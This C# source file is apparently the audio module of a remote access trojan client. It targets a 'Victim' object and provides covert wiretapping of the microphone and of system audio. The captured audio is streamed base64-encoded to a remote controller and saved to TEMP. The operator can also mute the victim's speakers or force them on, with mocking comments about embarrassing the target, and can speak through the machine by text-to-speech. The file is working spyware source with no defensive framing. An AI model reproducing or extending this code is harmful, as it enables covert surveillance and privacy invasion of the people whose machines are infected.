using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Speech.Synthesis;
using System.IO;
using NAudio.Wave;
using NAudio.CoreAudioApi;
using System.Media;

namespace winClient48
{
    internal class MicAudio
    {
        public enum TapType
        {
            Audio,
            Microphone,
        }

        private WaveFormat wave_format;

        public Victim v;

        private List<Tuple<int, string>> mic_devices = new List<Tuple<int, string>>();
        private List<Tuple<int, string>> speaker_devices = new List<Tuple<int, string>>();

        private MicrophoneCapture mic_cap;
        private SystemAudioCapture sys_cap;

        public string micMP3_output { get; set; }
        public string sysMP3_output { get; set; }

        public bool micWiretap { get; set; }
        public bool sysWiretap { get; set; }

        private MMDevice default_device;
        private MMDeviceEnumerator device_enum;
        private AudioEndpointVolume device_volume;

        public bool MuteDevice { get; set; } //SHUT SOMEONE MOUTH
        public bool DisableMute { get; set; } //MAKE SOMEONE EMBARRASSING

        private DateTime last_update;

        private FileStream mic_mp3FileStream;
        private FileStream sys_mp3FileStream;

        private WaveFileWriter mic_mp3Writer;
        private WaveFileWriter sys_mp3Writer;

        private bool g_bMicRecord = false;
        private bool g_bSysRecord = false;

        public MicAudio(Victim v, string mic_output, string sys_output)
        {
            micMP3_output = mic_output;
            sysMP3_output = sys_output;

            wave_format = new WaveFormat(44100, 1);

            MuteDevice = false;
            DisableMute = false;

            micWiretap = false;
            sysWiretap = false;

            last_update = DateTime.Now;

            this.v = v;

            for (int i = 0; i < WaveInEvent.DeviceCount; i++)
            {
                var device = WaveInEvent.GetCapabilities(i);
                mic_devices.Add(Tuple.Create(i, device.ProductName));
            }

            device_enum = new MMDeviceEnumerator();
            int j = 0;
            foreach (var device in device_enum.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active))
            {
                speaker_devices.Add(Tuple.Create(j, device.FriendlyName));
                j++;
            }

            default_device = device_enum.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
            device_volume = default_device.AudioEndpointVolume;
            device_volume.OnVolumeNotification += (e) =>
            {
                if (MuteDevice)
                {
                    device_volume.Mute = MuteDevice;
                    device_volume.MasterVolumeLevelScalar = 0.0f;
                }

                float vol = device_volume.MasterVolumeLevelScalar * 100.0f;
                UpdateVol(vol);
            };
        }

        public (int, string) StartMicRecord(string szMp3FileName = null, bool bOffline = false)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                micMP3_output = string.IsNullOrEmpty(szMp3FileName) ? micMP3_output : szMp3FileName;
                micMP3_output = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), micMP3_output);

                if (bOffline)
                {
                    mic_mp3FileStream = new FileStream(micMP3_output, FileMode.OpenOrCreate);
                    mic_mp3Writer = new WaveFileWriter(mic_mp3FileStream, wave_format);
                }

                g_bMicRecord = true;

                msg = micMP3_output;
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }
        public (int, string) StopMicRecord()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                mic_mp3Writer?.Close();
                mic_mp3Writer?.Dispose();

                g_bMicRecord = false;
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public (int, string) StartSysRecord(string szMp3FileName = null, bool bOffline = false)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                sysMP3_output = string.IsNullOrEmpty(szMp3FileName) ? sysMP3_output : szMp3FileName;
                sysMP3_output = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), sysMP3_output);

                if (bOffline)
                {
                    sys_mp3FileStream = new FileStream(sysMP3_output, FileMode.OpenOrCreate);
                    sys_mp3Writer = new WaveFileWriter(sys_mp3FileStream, wave_format);
                }

                g_bSysRecord = true;

                msg = sysMP3_output;
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }
        public (int, string) StopSysRecord()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                sys_mp3Writer?.Close();
                sys_mp3Writer?.Dispose();

                g_bSysRecord = false;
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        
        public List<Tuple<int, string>> GetMicrophoneDevices()
        {
            return mic_devices;
        }
        public List<Tuple<int, string>> GetSpeakerDevices()
        {
            return speaker_devices;
        }

        public (int, string) StartWiretapping(string tap_type, int idx)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                TapType type = (TapType)Enum.Parse(typeof(TapType), tap_type);
                switch (type)
                {
                    case TapType.Audio:
                        sysWiretap = true;
                        sys_cap = new SystemAudioCapture();
                        sys_cap?.Start(v, idx, SendBuffer);
                        break;
                    case TapType.Microphone:
                        micWiretap = true;
                        mic_cap = new MicrophoneCapture();
                        mic_cap?.Start(v, SendBuffer);
                        break;
                }
            }
            catch (Exception ex)
            {
                msg = ex.Message;
                code = 0;
            }

            return (code, msg);
        }
        public (int, string) StopWiretapping(string tap_type, int idx)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                TapType type = (TapType)Enum.Parse(typeof(TapType), tap_type);
                switch (type)
                {
                    case TapType.Audio:
                        sysWiretap = false;
                        sys_cap?.Stop();
                        sys_cap?.Dispose();
                        sys_cap = null;
                        break;
                    case TapType.Microphone:
                        micWiretap = false;
                        mic_cap?.Stop();
                        mic_cap?.Dispose();
                        mic_cap = null;
                        break;
                }
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public void StopRecord(string tap_type)
        {
            TapType type = (TapType)Enum.Parse(typeof(TapType), tap_type);
            switch (type)
            {
                case TapType.Audio:
                    sys_cap?.Stop();
                    break;
                case TapType.Microphone:
                    mic_cap?.Stop();
                    break;
            }
        }

        public void SpeechText(string text, int volume)
        {
            var synthesizer = new SpeechSynthesizer();
            synthesizer.Volume = volume;
            synthesizer.Speak(text);
        }

        public void SaveToWav(string filepath, byte[] pcm_data, int bytes_recorded)
        {
            try
            {
                using (var wave_file = new WaveFileWriter(filepath, wave_format))
                {
                    wave_file.Write(pcm_data, 0, bytes_recorded);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void FixVolume(bool mute, int volume)
        {

        }

        public void SetSystemAudioVolume(float volume)
        {
            device_volume.MasterVolumeLevelScalar = volume / 100.0f;
            default_device.AudioEndpointVolume.Mute = volume == 0;
        }

        public double Bytes_dB(byte[] buffer, int bytes_recorded)
        {
            short[] samples = new short[bytes_recorded / 2];
            for (int i = 0; i < samples.Length; i++)
            {
                samples[i] = BitConverter.ToInt16(buffer, i * 2);
            }

            // Calculate RMS (Root Mean Square) for volume intensity
            double rms = 0;
            foreach (var sample in samples)
            {
                rms += sample * sample;
            }
            rms = Math.Sqrt(rms / samples.Length);

            // Convert RMS to decibels (dB)
            double decibels = 20 * Math.Log10(rms / short.MaxValue);
            if (double.IsNegativeInfinity(decibels)) decibels = -96;

            return decibels;
        }

        public void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded)
        {
            v.encSend(2, 0, $"audio|wiretap|{type}|buffer|{Bytes_dB(buffer, bytes_recorded)}|" + Convert.ToBase64String(buffer));

            if (type == "micro" && g_bMicRecord)
            {
                mic_mp3Writer.Write(buffer, 0, buffer.Length);
            }
            else if (type == "system" && g_bSysRecord)
            {
                sys_mp3Writer.Write(buffer, 0, buffer.Length);
            }
        }

        private void UpdateVol(float vol)
        {
            if (DateTime.Now - last_update < TimeSpan.FromMilliseconds(1000))
                return;

            last_update = DateTime.Now;
            vol = vol > 100.0f ? 100.0f : vol;
            v.encSend(2, 0, "audio|update|vol|" + vol);
        }
    }

    //Event
    public class AudioCaptureEventArgs : EventArgs
    {
        public byte[] AudioBytes { get; }

        public AudioCaptureEventArgs(byte[] audio_bytes)
        {
            AudioBytes = audio_bytes;
        }
    }

    //Capture Microphone Audio
    public class MicrophoneCapture : IDisposable
    {
        private WaveInEvent wave_in;
        public event EventHandler<AudioCaptureEventArgs> DataAvailable;
        private MicAudio micAudio;
        public delegate void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded);
        private SendBuffer sendBuffer;

        private Victim v;

        private bool bDisposed = false;

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposing)
            {
                wave_in.Dispose();
                bDisposed = true;
            }
        }

        ~MicrophoneCapture()
        {
            Dispose(false);
        }

        public void Start(Victim v, SendBuffer sendBuffer)
        {
            this.v = v;
            this.sendBuffer = sendBuffer;
            wave_in = new WaveInEvent()
            {
                WaveFormat = new WaveFormat(44100, 16, 1), //44.1kHz, 16-bit, mono
            };
            wave_in.DataAvailable += OnDataAvailable;
            wave_in.StartRecording();
        }
        public void Stop()
        {
            if (wave_in != null)
            {
                wave_in.StopRecording();
                wave_in.Dispose();
                wave_in = null;
            }
        }

        private void OnDataAvailable(object sender, WaveInEventArgs e)
        {
            byte[] buffer = e.Buffer;
            int bytes_recorded = e.BytesRecorded;

            byte[] audio_data = new byte[bytes_recorded];
            Array.Copy(buffer, 0, audio_data, 0, bytes_recorded);

            sendBuffer(v, "micro", buffer, bytes_recorded);

            DataAvailable?.Invoke(this, new AudioCaptureEventArgs(audio_data));
        }
    }

    //Capture System Audio
    public class SystemAudioCapture
    {
        private WasapiLoopbackCapture wasApiCapture;
        private WaveFileWriter writer;
        private Victim v;
        public delegate void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded);
        private SendBuffer sendBuffer;

        public event EventHandler<AudioCaptureEventArgs> DataAvailable;

        private bool bDisposed = false;

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposing)
            {
                wasApiCapture.Dispose();
                writer.Close();
                writer.Dispose();
                bDisposed = true;
            }
        }

        ~SystemAudioCapture()
        {
            Dispose(false);
        }

        public void Start(Victim v, int idx, SendBuffer sendBuffer)
        {
            this.v = v;
            this.sendBuffer = sendBuffer;
            wasApiCapture = new WasapiLoopbackCapture();
            wasApiCapture.WaveFormat = new WaveFormat(44100, 16, 1); //44.1kHz, 16-bit, mono
            wasApiCapture.DataAvailable += OnDataAvailable;
            wasApiCapture.StartRecording();
        }

        public void Stop()
        {
            if (wasApiCapture != null)
            {
                wasApiCapture.StopRecording();
                wasApiCapture.Dispose();
                wasApiCapture = null;
            }
        }

        private void OnDataAvailable(object sender, WaveInEventArgs e)
        {
            byte[] buffer = e.Buffer;
            int bytes_recorded = e.BytesRecorded;

            byte[] audioData = new byte[bytes_recorded];
            Array.Copy(buffer, 0, audioData, 0, bytes_recorded);

            sendBuffer(v, "system", buffer, bytes_recorded);

            DataAvailable?.Invoke(this, new AudioCaptureEventArgs(audioData));
        }
    }

    //Play Audio
    public class AudioPlayer
    {
        private BufferedWaveProvider bufferedWaveProvider;
        private WaveOutEvent waveOut;

        public AudioPlayer()
        {
            bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 16, 1)); // 44.1kHz, 16-bit, mono
            waveOut = new WaveOutEvent();
            waveOut.Init(bufferedWaveProvider);
        }

        public void Start()
        {
            waveOut.Play();
        }

        public void Play(byte[] audioData)
        {
            // Write the audio data into the buffer
            bufferedWaveProvider.AddSamples(audioData, 0, audioData.Length);
        }

        public void PlayFromMP3(string mp3_file)
        {

        }

        public void SystemSound(int dwSound)
        {
            switch (dwSound)
            {
                case 0:
                    SystemSounds.Asterisk.Play();
                    break;
                case 1:
                    SystemSounds.Beep.Play();
                    break;
                case 2:
                    SystemSounds.Exclamation.Play();
                    break;
                case 3:
                    SystemSounds.Hand.Play();
                    break;
                case 4:
                    SystemSounds.Question.Play();
                    break;
            }
        }

        public void Stop()
        {
            waveOut.Stop();
            waveOut.Dispose();
        }
    }
}
